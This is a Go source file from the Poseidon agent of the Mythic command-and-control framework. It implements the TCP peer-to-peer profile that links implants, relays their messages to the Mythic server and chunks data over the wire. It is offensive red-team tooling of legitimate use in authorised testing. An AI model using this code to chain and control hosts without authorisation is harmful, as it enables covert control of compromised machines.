package p2p

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"sync"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/google/uuid"
)

var (
	internalTCPConnections     = make(map[string]*net.Conn)
	internalTCPConnectionMutex sync.RWMutex
	internalTCPMapping         = make(map[string]string)
	poseidonChunkSize          = uint32(30000)
)

type poseidonTCP struct {
}

func (c poseidonTCP) ProfileName() string {
	return "tcp"
}
func (c poseidonTCP) ProcessIngressMessageForP2P(delegate *structs.DelegateMessage) {
	var err error = nil
	//utils.PrintDebug(fmt.Sprintf("Locking ProcessIngressMessageForP2P to send message to internal p2p connection"))
	internalTCPConnectionMutex.Lock()
	conn, ok := internalTCPConnections[delegate.MythicUUID]
	if !ok {
		conn, ok = internalTCPConnections[delegate.UUID]
	}
	if ok {
		//utils.PrintDebug(fmt.Sprintf("ProcessIngressMessageForP2P:\n%v\n", delegate))
		if delegate.MythicUUID != "" && delegate.MythicUUID != delegate.UUID {
			// Mythic told us that our UUID was fake and gave the right one
			utils.PrintDebug(fmt.Sprintf("updating ID: %s from %s\n", delegate.MythicUUID, delegate.UUID))
			internalTCPConnections[delegate.MythicUUID] = conn
			internalTCPMapping[delegate.UUID] = delegate.MythicUUID
			addInternalConnectionUUID(delegate.UUID, delegate.MythicUUID)
			// remove our old one
			utils.PrintDebug(fmt.Sprintf("removing internal tcp connection for: %s\n", delegate.UUID))
			delete(internalTCPConnections, delegate.UUID)
		}
		//utils.PrintDebug(fmt.Sprintf("Sending ingress data to P2P connection\n"))
		//err = SendTCPData([]byte(delegate.Message), *conn)
		err = c.ChunkAndWriteData(*conn, []byte(delegate.Message))
	} else {
		utils.PrintDebug(fmt.Sprintf("ProcessIngressMessageForP2P: UUID %s not found\n", delegate.UUID))
	}
	internalTCPConnectionMutex.Unlock()
	//utils.PrintDebug(fmt.Sprintf("Unlocked ProcessIngressMessageForP2P to send message to internal p2p connection"))
	//utils.PrintDebug(c.GetInternalP2PMap())
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send data to linked p2p connection, %v\n", err))
		go c.RemoveInternalConnection(delegate.UUID)
	}
}
func (c poseidonTCP) RemoveInternalConnection(connectionUUID string) bool {
	internalTCPConnectionMutex.Lock()
	defer internalTCPConnectionMutex.Unlock()
	removedSuccessfully := false
	if conn, ok := internalTCPConnections[connectionUUID]; ok {
		utils.PrintDebug(fmt.Sprintf("about to remove a connection, %s\n", connectionUUID))
		//printInternalTCPConnectionMap()
		(*conn).Close()
		delete(internalTCPConnections, connectionUUID)
		//fmt.Printf("connection removed, %s\n", connectionUUID)
		//utils.PrintDebug(c.GetInternalP2PMap())
		select {
		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
			ConnectionUUID: connectionUUID,
			C2ProfileName:  "tcp",
		}:
		}
		removedSuccessfully = true
	}
	if mythicUUID, ok := internalTCPMapping[connectionUUID]; ok {
		select {
		case RemoveInternalConnectionChannel <- structs.RemoveInternalConnectionMessage{
			ConnectionUUID: mythicUUID,
			C2ProfileName:  "tcp",
		}:
		}
		removedSuccessfully = true
	}
	// we don't know about this connection we're asked to close
	return removedSuccessfully

}
func (c poseidonTCP) AddInternalConnection(connection interface{}) {
	//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
	connectionUUID := uuid.New().String()
	internalTCPConnectionMutex.Lock()
	defer internalTCPConnectionMutex.Unlock()

	newConnectionString := (*connection.(*net.Conn)).RemoteAddr().String()
	utils.PrintDebug(fmt.Sprintf("new connection with UUID ( %s ) for %v\n", connectionUUID, newConnectionString))
	for _, v := range internalTCPConnections {
		if (*v).RemoteAddr().String() == newConnectionString {
			// we already have an existing connection to this IP:Port combination, close old one
			utils.PrintDebug("already have connection, closing old one")
			(*v).Close()
			break
		}
	}
	internalTCPConnections[connectionUUID] = connection.(*net.Conn)
	go c.readFromInternalTCPConnections(connection.(*net.Conn), connectionUUID)
}
func (c poseidonTCP) GetInternalP2PMap() string {
	output := "----- InternalConnectionsMap ------\n"
	internalTCPConnectionMutex.RLock()
	defer internalTCPConnectionMutex.RUnlock()
	for k, v := range internalTCPConnections {
		output += fmt.Sprintf("UUID: %s, Connection: %s\n", k, (*v).RemoteAddr().String())
	}
	output += fmt.Sprintf("---- done -----\n")
	return output
}
func (c poseidonTCP) GetChunkSize() uint32 {
	return poseidonChunkSize
}
func (c poseidonTCP) readFromInternalTCPConnections(newConnection *net.Conn, tempConnectionUUID string) {
	// read from the internal connections to pass back out to Mythic
	//fmt.Printf("readFromInternalTCPConnection started for %v\n", newConnection)
	//fmt.Printf("reading from newInternalTCPConnection: %s\n", tempConnectionUUID)
	for {
		utils.PrintDebug(fmt.Sprintf("about to read from internal tcp connection\n"))
		readBuffer, err := c.ReadAndChunkData(*newConnection)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to read from tcp connection: %v\n", err))
			c.RemoveInternalConnection(getInternalConnectionUUID(tempConnectionUUID))
			return
		}
		if len(readBuffer) == 0 {
			continue
		}
		newDelegateMessage := structs.DelegateMessage{}
		newDelegateMessage.Message = string(readBuffer)
		//utils.PrintDebug(fmt.Sprintf("creating delegate message for NewDelegatesToMythicChannel. tempUUID : %s, convertedUUID: %s\n", tempConnectionUUID, getInternalConnectionUUID(tempConnectionUUID)))
		newDelegateMessage.UUID = getInternalConnectionUUID(tempConnectionUUID)
		//fmt.Printf("converted %s to %s when sending message to Mythic\n", tempConnectionUUID, newDelegateMessage.UUID)
		newDelegateMessage.C2ProfileName = c.ProfileName()
		//utils.PrintDebug(fmt.Sprintf("adding message to responses.NewDelegatesToMythicChannel: %v\n", len(responses.NewDelegatesToMythicChannel)))
		responses.NewDelegatesToMythicChannel <- newDelegateMessage

	}
}
func init() {
	registerAvailableP2P(poseidonTCP{})
}

func (c poseidonTCP) ChunkAndWriteData(conn net.Conn, data []byte) error {
	/*
		uint32 <-- total size of message (total chunks + current chunk + chunk data)
		uint32 <-- total chunks
		uint32 <-- current chunk
		byte[] <-- chunk of agent message
	*/
	totalChunks := (uint32(len(data)) / c.GetChunkSize()) + 1
	currentChunk := uint32(0)
	for currentChunk < totalChunks {
		var chunkData []byte
		if (currentChunk+1)*c.GetChunkSize() >= uint32(len(data)) {
			chunkData = data[currentChunk*c.GetChunkSize():]
		} else {
			chunkData = data[currentChunk*c.GetChunkSize() : (currentChunk+1)*c.GetChunkSize()]
		}
		// first write the size of the chunk + size of total chunks + size of current chunk
		err := binary.Write(conn, binary.BigEndian, uint32(len(chunkData)+8))
		if err != nil {
			return err
		}
		err = binary.Write(conn, binary.BigEndian, totalChunks)
		if err != nil {
			return err
		}
		err = binary.Write(conn, binary.BigEndian, currentChunk)
		if err != nil {
			return err
		}
		totalWritten := 0
		for totalWritten < len(chunkData) {
			currentWrites, err := conn.Write(chunkData[totalWritten:])
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
				return err
			}
			totalWritten += currentWrites
			if currentWrites == 0 {
				return errors.New("failed to write to connection")
			}
		}
		utils.PrintDebug(fmt.Sprintf("sent %d bytes\n", uint32(len(chunkData))))
		currentChunk += 1
	}
	return nil
}
func (c poseidonTCP) readXBytes(conn net.Conn, numOfBytes uint32) ([]byte, error) {
	var totalBytes []byte
	readBuffer := make([]byte, numOfBytes)
	readSoFar, err := conn.Read(readBuffer)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("failed to read bytes from tcp connection: %v\n", err))
		return nil, err
	}
	totalRead := uint32(readSoFar)
	for totalRead < uint32(len(readBuffer)) {
		// we didn't read the full size of the message yet, read more
		nextBuffer := make([]byte, numOfBytes-totalRead)
		readSoFar, err = conn.Read(nextBuffer)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("failed to read more bytes from tcp connection: %v\n", err))
			return nil, err
		}
		copy(readBuffer[totalRead:], nextBuffer)
		totalRead = totalRead + uint32(readSoFar)
	}
	// finished reading this chunk and all of its data
	totalBytes = append(totalBytes, readBuffer...)
	return totalBytes, nil
}
func (c poseidonTCP) bytesToBigEndian(data []byte) uint32 {
	return binary.BigEndian.Uint32(data)
}
func (c poseidonTCP) ReadAndChunkData(conn net.Conn) ([]byte, error) {
	var sizeBuffer uint32
	var totalChunks uint32
	var currentChunk uint32

	var totalBytes []byte
	for {
		utils.PrintDebug(fmt.Sprintf("Starting to read from p2p connection\n"))
		sizeBytes, err := c.readXBytes(conn, 4)
		if err != nil {
			return nil, err
		}
		//utils.PrintDebug(fmt.Sprintf("got size bytes: %v\n", sizeBytes))
		sizeBuffer = c.bytesToBigEndian(sizeBytes)
		if sizeBuffer == 0 {
			//utils.PrintDebug(fmt.Sprintf("got 0 size from remote connection\n"))
			return nil, nil
		}
		totalChunksBytes, err := c.readXBytes(conn, 4)
		if err != nil {
			return nil, err
		}
		//utils.PrintDebug(fmt.Sprintf("got total chunks bytes: %v\n", totalChunksBytes))
		totalChunks = c.bytesToBigEndian(totalChunksBytes)
		currentChunkBytes, err := c.readXBytes(conn, 4)
		if err != nil {
			return nil, err
		}
		//utils.PrintDebug(fmt.Sprintf("got current chunk bytes: %v\n", currentChunkBytes))
		currentChunk = c.bytesToBigEndian(currentChunkBytes)
		utils.PrintDebug(fmt.Sprintf("Starting read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, sizeBuffer-8))
		chunkBytes, err := c.readXBytes(conn, sizeBuffer-8)
		// finished reading this chunk and all of its data
		totalBytes = append(totalBytes, chunkBytes...)
		//copy(totalBytes[len(totalBytes):], readBuffer[:])
		utils.PrintDebug(fmt.Sprintf("Finished read for %d/%d chunks, for size %d\n", currentChunk+1, totalChunks, sizeBuffer-8))
		if currentChunk+1 == totalChunks {
			utils.PrintDebug(fmt.Sprintf("Finished read for all chunks, for size %d\n", len(totalBytes)))
			return totalBytes, nil
		}
	}
}
